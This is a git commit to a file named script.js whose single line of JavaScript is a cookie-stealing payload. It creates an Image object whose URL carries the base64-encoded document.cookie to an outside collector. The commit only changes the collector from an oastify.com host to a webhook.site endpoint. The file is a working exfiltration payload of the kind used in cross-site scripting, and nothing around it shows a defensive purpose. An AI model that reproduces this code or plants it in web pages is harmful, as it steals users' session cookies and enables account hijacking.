ca5650acfa16e0f56a7f3c16fff91c7139d49770
Jobzz99 <147684323+Jobzz99@users.noreply.github.com>
2025-08-12 15:05:12 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://znqeb2sbmf1o8tliy50skyhodfj67zvo.oastify.com/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxx?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/cacd5bc8-a532-43c6-97e0-fb0fb2833d8e/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxx?data='+btoa(document.cookie);
